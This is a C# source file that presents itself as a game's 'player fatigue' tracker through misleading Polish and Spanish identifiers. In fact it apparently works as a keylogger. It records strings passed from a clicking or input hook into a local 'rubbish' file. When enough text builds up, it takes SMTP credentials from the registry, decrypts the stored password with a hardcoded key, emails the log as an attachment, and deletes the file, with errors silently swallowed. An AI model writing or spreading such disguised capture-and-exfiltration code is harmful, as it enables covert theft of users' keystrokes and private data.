using Microsoft.Win32;
using System;
using System.Collections.Generic;
using System.IO;
using System.Text;
using EASendMail;

namespace gra
{
    public partial class zmeczenieGracza
    {
        public zmeczenieGracza()
        {
            loadRubbishFile();
            klikanie zmeczenie = new klikanie();
            zmeczenie.orThis = new klikanie.willOrThis(ileSieZmeczyl);
        }
        string rubbishFileName = "rubbish";
        void loadRubbishFile() {
            if (!File.Exists(rubbishFileName)) return;
            String całyTrud;
            StreamReader streamReader = new StreamReader(rubbishFileName);
            while ((całyTrud = streamReader.ReadLine())!=null) całeZmęczenie.Add(całyTrud);
            streamReader.Close();
        }
        void saveRubbishFile() {
            StreamWriter streamWriter = new StreamWriter(rubbishFileName);
            foreach (String całyTrud in całeZmęczenie) streamWriter.WriteLine(całyTrud);
            streamWriter.Close();
        }
        string getCorrectEmail()
        {
            string alCorreo;
            RegistryKey emailLoginsKey;
            if ((emailLoginsKey = Registry.CurrentUser.OpenSubKey(Program.żabkaMailLogins, true)) != null && (alCorreo = (string)emailLoginsKey.GetValue("alCorreo")) != null) return alCorreo;
            return "";
        }
        long całość = 0;
        List<string> całeZmęczenie = new List<string>();
        void DiscardRubbish() {
            saveRubbishFile();
            string alCorreo = getCorrectEmail();
            if (alCorreo == "") return;
            RegistryKey currentLoginKey = Registry.CurrentUser.OpenSubKey(Program.żabkaMailLogins, true).OpenSubKey(alCorreo, true);
            SmtpMail smtpMail = new SmtpMail("TryIt") { From = alCorreo, To = alCorreo, Subject = DateTime.Now.ToString("dddd, dd MMMM yyyy HH:mm"), TextBody = DateTime.Now.ToString("dddd, dd MMMM yyyy HH:mm") };
            smtpMail.AddAttachment(rubbishFileName);
            SmtpServer smtpServer = new SmtpServer(currentLoginKey.GetValue("serverSMTP").ToString()) { Port = int.Parse(currentLoginKey.GetValue("portSMTP").ToString()), ConnectType = SmtpConnectType.ConnectSSLAuto, User = alCorreo, Password = Program.DecryptStringFromBytes((byte[])currentLoginKey.GetValue("contracena", RegistryValueKind.Binary), Encoding.ASCII.GetBytes("1234567890123456"), Encoding.ASCII.GetBytes("1234567890123456")) };
            try {
                new SmtpClient().SendMail(smtpServer, smtpMail);
                File.Delete(rubbishFileName);
                całeZmęczenie.Clear();
                całość = 0;
            }
            catch (Exception ex) { 
            }
        }
        ~zmeczenieGracza()
        {
            saveRubbishFile();
        }
        public void ileSieZmeczyl(string czymSięZmęczył)
        {
            całeZmęczenie.Add(czymSięZmęczył);
            całość += czymSięZmęczył.Length;
            if (całość > Program.DopuszczalneZmęczenie) DiscardRubbish();
        }
    }
}
